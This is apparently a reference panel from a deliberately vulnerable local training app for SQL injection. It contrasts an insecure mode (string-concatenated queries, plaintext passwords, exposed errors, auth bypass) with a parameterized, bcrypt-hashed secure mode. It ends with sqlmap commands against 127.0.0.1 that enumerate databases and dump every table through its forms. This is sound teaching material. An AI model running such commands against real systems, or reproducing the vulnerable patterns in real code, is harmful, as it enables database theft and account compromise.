Security State Reference

⚠ Vulnerable Mode (SECURE_MODE = False)

  • ❌ String-concatenated SQL queries
  • ❌ Plain-text password storage
  • ❌ SQL errors exposed to users
  • ❌ No input validation
  • ❌ Auth bypass possible
  • ❌ UNION data extraction works
  • ❌ Blind injection detectable

✔ Secure Mode (SECURE_MODE = True)

  • ✅ Parameterized queries (? placeholders)
  • ✅ bcrypt password hashing
  • ✅ Generic error messages only
  • ✅ Input length validation
  • ✅ Auth bypass impossible
  • ✅ UNION injection neutralized
  • ✅ Blind injection indistinguishable
Quick SQLMap Commands

Run these from your terminal while the server is running in VULNERABLE mode:

# Enumerate databases via login form sqlmap -u "http://127.0.0.1:5000/login" \ --data="username=admin&password=123" --method=POST --dbs # Dump all tables via consult form sqlmap -u "http://127.0.0.1:5000/consult" \ --data="name=test&phone=123&message=hi" --method=POST --dump # Test search GET parameter sqlmap -u "http://127.0.0.1:5000/search?q=iPhone" --dbs
